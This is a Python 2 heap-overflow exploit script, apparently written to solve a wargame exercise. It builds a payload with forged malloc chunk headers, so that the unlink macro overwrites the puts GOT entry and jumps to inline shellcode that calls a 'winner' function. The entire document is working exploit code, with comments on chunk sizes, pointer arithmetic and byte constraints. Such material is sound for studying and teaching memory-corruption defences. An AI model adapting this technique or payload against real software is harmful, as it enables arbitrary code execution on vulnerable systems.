#!/usr/bin/python2.6

import struct

# Restrictions: 
#   chunk size must be >= 16 Bytes == MIN_SIZE
#   chun size must be > 64 Bytes == DEFAULT_MXFAST if we don't want to be inserted in a fastbin
#
#

got_plt__puts = 0x0804b128
winner_addr = 0x08048864
unlink_wb_address = 0x0804c010 # address in which the unlink macro will write as an unavoidable side effect

chunk0_padding_start = "A"*8 # Here 4 Bytes will be written as a result of unlink, and 4 more bytes as padding because we cannot write ine 0x0804c000. (NULL byte)
# This gadget works but it should contain a relative jump, because the firs 4 nops are overwritten by the unlink macro
chunk0_gadget =  (
    "\x90"*4                                + #nop x4 times
#    "\xcc"                                  + #int3
    "\xb8" + struct.pack("P", winner_addr)  + #mov    eax,winner_addr 
    "\xff\xd0"                              + #call   eax
    "\x90"*4                                  #nop x4 times
) 
chunk0_padding_end = "A"*(24-len(chunk0_gadget))
chunk1_prev_sz = "A"*4
chunk1_sz = struct.pack("I", 0x28) # Last bit is intentionally zero. Fortunatelly we are in little endian, because strcpy is used
arg1 = chunk0_padding_start + (
    chunk0_gadget       +
    chunk0_padding_end  +
    chunk1_prev_sz      +
    chunk1_sz
)

chunk1_padding_start = "B"*8
fake_chunk_prev_sz = "B"*4
fake_chunk_sz = struct.pack("I", 0xFFFFFFF1) # -16 with the last bit set
fake_chunk_fd = struct.pack("P", (got_plt__puts - 12)) # 0x0804b11c
fake_chunk_bk = struct.pack("P", (unlink_wb_address - 8)) # will write in bytes [a[4], a[7]]. 0x0804c008
chunk1_padding_end = "B"*8

chunk2_prev_sz = "C"*4
chunk2_sz = struct.pack("I", 0xffffffE9) # -24 with the last bit set
arg2 = chunk1_padding_start + (
    fake_chunk_prev_sz  + 
    fake_chunk_sz       +
    fake_chunk_fd       +
    fake_chunk_bk       +
    chunk1_padding_end  +
    chunk2_prev_sz      +
    chunk2_sz
)


chunk3_data = "D"*32
arg3 = chunk3_data

payload = arg1 + " " + arg2 + " " + arg3
print(payload)
